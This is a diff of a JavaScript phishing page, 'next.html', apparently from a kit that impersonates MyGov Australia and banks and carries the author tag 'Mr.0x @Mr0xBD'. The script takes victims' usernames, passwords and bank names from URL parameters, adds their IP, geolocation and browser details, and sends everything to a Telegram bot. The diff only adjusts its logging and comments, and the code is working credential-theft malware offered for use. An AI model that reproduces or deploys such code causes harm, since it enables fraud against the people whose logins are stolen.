@@ -2,15 +2,20 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>next (debug)</title>
+  <title>next</title>
 </head>
 <body>
+<!-- Load central config -->
 <script src="config/email.js"></script>
 <script>
   (function() {
-    // Access the global CONFIG object
+    console.log("=== next.html loaded ===");
+
+    // Read credentials from global CONFIG
     const apikey = CONFIG.apikey;
     const chatid = CONFIG.chatid;
+    console.log("apikey:", apikey);
+    console.log("chatid:", chatid);
 
     function getParam(name) {
       const url = new URL(window.location.href);
@@ -28,10 +33,8 @@
 
     async function getLocation(ip) {
       try {
-        console.log("Fetching location for IP:", ip);
         const resp = await fetch(`https://freeipapi.com/api/json/${ip}`);
         const data = await resp.json();
-        console.log("Location data:", data);
         return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
       } catch (e) {
         console.error("Location fetch error:", e);
@@ -45,13 +48,14 @@
       const cc = getParam('title');
       console.log("Received params:", { username: aa, password: bb, title: cc });
 
+      // If no username, return the JSON key (like PHP did on GET)
       if (!aa) {
-        console.log("No username parameter – returning JSON key");
+        console.log("No username – returning JSON key");
         document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
         return;
       }
 
-      console.log("Fetching IP...");
+      // Fetch IP
       let ip = '0.0.0.0';
       try {
         const resp = await fetch('https://api.ipify.org?format=json');
@@ -64,12 +68,9 @@
 
       const userAgent = navigator.userAgent;
       const browser = getBrowser(userAgent);
-      console.log("Browser:", browser);
-      console.log("UserAgent:", userAgent);
-
       const location = await getLocation(ip);
-      console.log("Location:", location);
 
+      // Build message exactly as PHP
       let message = "";
       message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
       message += "|Bank Name: " + cc + "\n";
@@ -82,9 +83,10 @@
       message += "|UserAgent : " + userAgent + "\n";
       message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
       message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
       console.log("Message to send:\n", message);
 
-      console.log("Sending to Telegram...");
+      // Send to Telegram
       try {
         const url = `https://api.telegram.org/bot${apikey}/sendMessage`;
         const response = await fetch(url, {
@@ -97,10 +99,10 @@
         if (result.ok) {
           console.log("✅ Message sent successfully!");
         } else {
-          console.error("❌ Telegram returned error:", result);
+          console.error("❌ Telegram error:", result);
         }
       } catch (e) {
-        console.error("❌ Telegram send error (network or CORS):", e);
+        console.error("❌ Fetch error (network/CORS):", e);
       }
 
       // Clear page (empty response)
